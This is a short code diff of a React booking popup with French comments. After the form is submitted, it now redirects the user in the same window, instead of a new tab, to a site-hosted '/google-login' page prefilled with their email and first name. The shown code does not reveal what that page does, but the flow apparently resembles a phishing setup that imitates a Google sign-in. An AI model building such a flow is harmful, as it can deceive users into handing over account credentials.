@@ -58,14 +58,10 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
       // Afficher l'état de confirmation
       setShowConfirmation(true);
       
-      // Rediriger après 3 secondes
+      // Rediriger après 3 secondes vers la même page (sans nouvel onglet)
       setTimeout(() => {
-        // Ouvrir la page de login Google dans un nouvel onglet avec l'email et le prénom
-        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
-        
-        // Garder l'état de confirmation (ne pas fermer)
-        // setIsSubmitting(false);
-        // setShowConfirmation(false);
+        // Rediriger vers la page de login Google dans la même fenêtre
+        window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
       }, 3000);
       
     } catch (error) {
@@ -74,7 +70,7 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
       setShowConfirmation(true);
       
       setTimeout(() => {
-        window.open(`/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`, '_blank');
+        window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
       }, 3000);
     }
   };
